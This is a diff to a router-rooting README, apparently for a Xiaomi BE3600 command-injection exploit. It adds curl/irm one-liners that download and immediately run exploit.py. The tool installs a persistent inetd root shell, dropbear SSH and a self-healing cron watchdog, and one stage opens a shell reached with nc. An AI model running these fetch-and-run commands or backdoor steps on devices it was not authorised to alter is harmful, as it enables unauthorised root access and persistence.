@@ -49,6 +49,24 @@ dropbear + authorized_keys ────► :22 SSH (key and password auth)
 | Digit-ending frags | `echo -n ..D>/tmp/N` (D a digit) becomes an `D>` fd redirect writing nothing — pad with ` >` |
 | Writable areas | `/etc` ramfs wiped on boot; `/data`, `/etc/crontabs`, `/etc/config` persist |
 
+## One-liner (no clone, fully automatic)
+
+macOS / Linux (needs `python3` + `curl`):
+
+```bash
+curl -fsSLo /tmp/rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py && python3 /tmp/rd16.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist
+```
+
+Windows PowerShell (replace `python` with `py` if needed):
+
+```powershell
+irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist
+```
+
+- `--stage persist` does everything: injection → inetd (:23/:2323 root shell) → dropbear (:22 SSH) → `/data` + cron watchdog that self-heals after every reboot
+- append `--pubkey 'ssh-rsa AAAA...'` to also install an SSH public key, then `ssh root@192.168.31.1`
+- one-shot shell only: swap `--stage persist` for `--stage shell`, then `nc 192.168.31.1 23`
+
 ## Quick start (exploit.py)
 
 ```bash
